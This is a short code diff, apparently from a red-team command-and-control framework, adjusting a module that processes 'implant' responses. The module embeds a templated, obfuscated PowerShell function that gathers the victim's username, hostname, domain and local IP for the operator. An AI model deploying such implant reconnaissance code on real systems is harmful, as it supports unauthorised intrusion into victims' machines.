@@ -3,7 +3,7 @@ class SystemInfo:
     args = None
     input = "sys_info"
 
-    def process_implant_response(self, data):
+    def process_implant_response(self, data, args):
         split_data = data.decode().split("\n")
         print(split_data)  # This should be a list of 4 items based on the below response.
         # Username: Kris
@@ -20,6 +20,5 @@ function {{ ron.obf_collect_sysinfo }}(){
     $a = (Test-Connection -ComputerName (hostname) -Count 1).IPV4Address
     $final_str = "Username: "+$env:UserName+"`nHostname: "+$h+"`nDomain: "+$d+"`nLocal IP: "+$a
     $Script:tr = $final_str
-}
-'''
+}'''
         return var
